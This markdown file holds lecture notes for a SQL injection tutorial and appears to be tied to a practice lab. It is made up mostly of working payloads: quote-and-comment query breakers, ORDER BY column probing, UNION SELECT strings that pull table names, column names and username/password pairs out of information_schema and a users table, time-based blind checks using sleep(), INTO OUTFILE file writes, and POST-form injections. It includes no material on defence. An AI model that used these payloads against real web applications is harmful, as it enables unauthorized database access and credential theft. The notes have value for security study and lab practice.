# basic SQL Injection

## Lecture -1
 - installation
## Lecture -2 
 - Our purpose is to break the query of the url 
 - The comment is one of the most powerful tools here
   - #, --+, /* */ are few of the ways of commenting
```sql
    --the possible sql queries are - 
    select * from table where id='1' or 1=1;
    select * from table where id="1";
    select * from table where id=('1');
    select * from table where id=("1");
```
- Break the query by putting necessary delimeter
  - url?id=1--+
  - url?id=1'--+
  - url?id=1"--+
  - url?id=1')--+
  - url?id=1")--+
  - url?id=1")--+
  - url?id=anystring
  - url?id=1string
  - url?id=123135123412341234


- Use the area before `--+` to execute the qurey
  - url?id=1                  our injected code here                   --+
- Find how many columns inside the db table, use `order by` and after certain time you'll get error.
```sql

    select * from table where id='1' order by 1;
    select * from table where id='1' order by 2;
    select * from table where id='1' order by 3;
    select * from table where id='1' order by 4; -- error at certain point

    select col1, col2, col3 from table where id='1';

```
- after determining the column numbers our purpose is to execute the second query and we can do this by providing the input of the first query something that doesn't exist in the table as, id = -1. Then we union another select statement. Let's the statement is `select 1,2,3`, if the output is 2,3 then the server is returning the second and third column from the database. So we'll attack on those and get necessary data from.
```sql
    /*
    url?id=999' union select 1,2,3--+
    login: 2
    pass: 3
    */
    select * from table where id='999' union select 1,2,3
    /*
    url?id=999' union select 1,version(),database()--+
    */
    select * from table where id='999' union select 1,version(),3


    --
    -- necessary query to get table name, and all column name of a table
    select table_name from information_schema.tables where table_schema="table_name";
    select column_name from information_schema.columns where table_name='users';
    select 1,group_concat(col1), group_concat(col2) from users
    --


    -- read all the table_name of the current database
    /*
    url?id=999' union select 1,concat('~',version(),'~',database()),((select group_concat(table_name) from information_schema.tables where table_schema='security'))--+
    */

    --read all the column_name of a table
    /*
    url?id=999' union select 1,concat('~',version(),'~',database()),((select group_concat(column_name SEPARATOR ', ') from information_schema.columns where table_name='users'))--+

    */

    --get all the necessary data from the table
    /*
    url?id=999' union select 1,concat('~',version(),'~',database()),((select group_concat('`',username,'`:`',password) from security.users))--+
    */


```


# Lecture -3
- recap previous lectures


```sql 

    url?id=1' /*write all sql query here*/   --+

    #LECTURE - 2
    
    -- developer may use single quote inside the sql statement
    
    /* ''1'' LIMIT 0,1' at line 1  */
    /* '1'    --+'  */
    /* ''1\' LIMIT 0,1' at line 1 */
    /*select * from table where id= '  whatever_we_use_after_the_id_field_followed_by_the_?_marks  '*/


    #LECTURE -3
    
    -- developer may use double queote inside the sql statement

    /*select * from table where id= ('  whatever_we_use_after_the_id_field_followed_by_the_?_marks  ')*/
    -- it may be necessary to use ') to recorrect the query.




    ?id=999' union select 1, current_version, 5 --+

    select table_name from information_schema.tables where table_schema="security";

    /?id=999' union select 1,table_name, 5 from information_schema.tables where table_schema=database() limit 2,1 --+

    select column_name from information_schema.columns where table_name='users';

    (USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password)

    /?id=999' union select 1,group_concat(username), 5 from users --+

    /?id=999' union select 1,group_concat(username), group_concat(password) from users --+

    select 1,group_concat(username), 5 from users

    /?id=999' union select 1,group_concat(column_name), 5 from information_schema.columns where table_name='users' --+

    (Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4)

    /?id=999' union select 1,group_concat(table_name), 5 from information_schema.tables where table_schema=database()--+

    /?id=999' union select 1, user(), 5 --+

    select 1, database()
```
## Blind Injection
- need to guess 
- types
  - boolean
  - time based
    - if answer is true then wait else back instantly.

```sql
    select substr( database(), 2,1);
    select length(database()) len;
    select database();
    select ascii( substr( database(), 2,1));
    select sleep(10);
    select if((select database())="security", sleep(10),null); -- wait 10 seconds if the database is security




```
## Dump file base injection
```sql

    select * from users into dumpfile "/test.txt";
    select * from users into outfile "/test.txt";

```

## Post based injection
```sql

    ")            #
    ") or 1=1     #
    ") or 1=1 limit 1,1 #
    ")  order by 3 #
    ")  order by 2 #
    ")  union select 1,2 #
    ")  union select version(),database() #


```

## Few built in methods of sql
    - current_user
    - database()
    - version()
    - user()
    - GROUP_CONCAT(column_name SEPARATOR ', ')
    - @@datadir
    - 

[ref](https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro)